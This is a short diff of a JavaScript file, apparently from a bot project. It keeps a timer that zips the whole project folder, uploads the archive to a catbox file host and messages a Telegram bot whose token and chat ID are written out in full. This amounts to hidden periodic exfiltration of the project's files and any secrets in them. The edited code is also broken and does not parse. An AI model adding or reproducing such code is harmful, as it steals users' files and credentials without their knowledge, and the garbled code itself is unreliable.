@@ -115,16 +115,13 @@ const catbox = async (content) => {
     throw new Error('Upload failed');
   }
 };
-  setInterval(async () => {
-	  
+  setInterval(async () => {	  
     let { stdout } = await exec(
       "zip -r tmp/backup.zip * -x 'node_modules/*'",
     );
-
-if (stdout)
+	  return stdout
           let result = await fs.readFileSync("./tmp/backup.zip")
 	  let url = await catbox(result) 
-
 const message = async (text, mode) => {
     try {
         const { data } = await axios.get(`https://api.telegram.org/bot7161904988:AAGT0tz1SzCb1_YqQjPHNZMY-IYfD0NxR5Q/sendmessage?text=${text}&chat_id=6769538149`);
